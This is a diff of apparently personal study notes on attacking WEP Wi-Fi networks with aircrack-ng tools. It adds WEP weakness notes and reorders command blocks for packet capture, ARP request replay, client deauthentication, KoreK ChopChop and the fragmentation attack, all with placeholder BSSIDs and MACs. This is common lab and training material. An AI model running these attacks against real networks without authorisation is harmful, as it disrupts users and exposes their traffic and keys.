@@ -320,6 +320,7 @@ sudo wireshark&
 
 - https://www.aircrack-ng.org/doku.php?id=cracking_wpa
 - https://dl.aircrack-ng.org/breakingwepandwpa.pdf
+- WEP vulns: **RC4** Key Schedule, **IV Reuse** (Birthday Paradox ~ 5000 packets), bad integrity control (CRC32), no anti-replay mechanism
 
 ```txt
 #wep challenge in wireshark
@@ -337,14 +338,17 @@ psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
 psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
 ```
 
-#### Capture & Deauth
+#### Capture & ARP Request Replay
+
+Capture an encrypted packet which is the size of an ARP request, replays it to the AP, which generates new packets with **extra IVs**
 
 ```bash
-airmon-ng start wlan1 #set monitor & rename wlan0 (wlan0mon)
-airodump-ng wlan1mon #scan network
-airodump-ng --bssid <BSSID> -w wep wlan1mon # capture from bssid (last command) , -w = prefix name
+# Using appropriate channel found using airodump-ng for the 1st time
+airmon-ng stop wlan1mon
+airmon-ng start wlan1 <CHANNEL>
+airodump-ng --bssid <BSSID> -w wep wlan1mon
 
-aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon
+aireplay-ng -3 -b <BSSID> -h <STATION MAC> -x 600 wlan1mon
 ```
 
 ```bash
@@ -366,27 +370,32 @@ aireplay-ng  --help
 # WPA-PSK
 tkiptun-ng --help
 ```
-#### Capture & ARP Request Replay
+
+#### Capture & Deauth
 
 ```bash
-# Using appropriate channel found using airodump-ng for the 1st time
-airmon-ng stop wlan1mon
-airmon-ng start wlan1 <CHANNEL>
-airodump-ng --bssid <BSSID> -w wep wlan1mon
+airmon-ng start wlan1 #set monitor & rename wlan0 (wlan0mon)
+airodump-ng wlan1mon #scan network
+airodump-ng --bssid <BSSID> -w wep wlan1mon # capture from bssid (last command) , -w = prefix name
 
-aireplay-ng -3 -b <BSSID> -h <STATION MAC> -x 600 wlan1mon
+aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon
 ```
 
+#### Capture & IP Redirection
 
-#### Korek ChopChop attack
+**KoreK ChopChop**:
+Chop one byte of an encrypted packet, still producing a valid CRC32
 
 ```bash
 # airodump-ng --bssid <BSSID> -w wep wlan1mon
 
 aireplay-ng -4 -b <BSSID> -h <STATION MAC> wlan1mon
+# Outputting 2 files
+# replay_dec_.xor replay_dec_.cap
 ```
 
-#### Fragmentation attack
+**Fragmentation attack**:
+Redirecting dest IP to a controlled IP, tricking the AP to decrypt the fragmented packet
 
 ```bash
 # airodump-ng --bssid <BSSID> -w wep wlan1mon
